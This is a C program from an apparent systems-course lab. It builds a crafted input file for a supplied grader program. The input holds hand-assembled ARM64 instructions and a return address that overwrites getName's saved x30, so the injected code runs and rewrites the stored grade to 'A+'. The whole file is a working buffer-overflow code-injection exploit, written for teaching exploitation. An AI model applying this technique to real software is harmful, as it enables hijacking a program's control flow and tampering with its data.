/*--------------------------------------------------------------------*/
/*   createdataAplus.c                                                */
/*   Author: Connor Brown, Laura Hwa                                  */
/*                                                                    */
/*   Produces a file called dataAplus with the student name, a        */
/*   padding to preceed assembly instruction, and the instructions    */
/*   needed to printf the "A" string, then pass the '+' character as  */
/*   an argument to the original formatted printf.Lastly, it injects  */
/*   the address of the first of these instructions into getName's x30*/
/*   register to execute them once getName pops off the function call */
/*   stack.                                                           */
/*--------------------------------------------------------------------*/
#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

/* Writes the "name" input for the grader.c prompt, byte-by-byte, to the 
   file named "dataAplus" */
int main (void) {
    FILE *psFile;
    char* partners = "Connor & Laura";
    int i;
    unsigned int uiCmd;
    unsigned long ulMovAdr;

    psFile = fopen("dataAplus", "w");

    fprintf(psFile, "%s", partners);

    /* padded null bytes */
    for (i = 0; i < 8; i++) {
        fprintf(psFile, "%c", '\0');
    }

    /* another string, "A", for printf to write as a stand-alone 
       argument */
    fprintf(psFile, "%c", 'A');
    fprintf(psFile, "%c", '\0');

    /* 0x420070      | adr x0, 0x42006E */
    uiCmd = MiniAssembler_adr(0, 0x42006E, 0x420070);
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* 0x420074      | bl printf */
    uiCmd = MiniAssembler_bl(0x400690, 0x420074);
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* 0x420078      | movw0, '+' */
    uiCmd = MiniAssembler_mov(0, '+');
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* 0x42007C      |adr x1, grade */
    uiCmd = MiniAssembler_adr(1, 0x420044, 0x42007C);
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* 0x420080      |strb w0, [x1] */
    uiCmd = MiniAssembler_strb(0, 1);
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* 0x420084      | b 0x40089c   */
    uiCmd = MiniAssembler_b(0x40089c, 0x420084);
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* overwrite getName()'s x30 with address where mov command begins. */
    ulMovAdr = 0x420070;
    fwrite(&ulMovAdr, sizeof(unsigned long), 1, psFile);

    /* close the file */
    fclose(psFile);

    return 0;
}
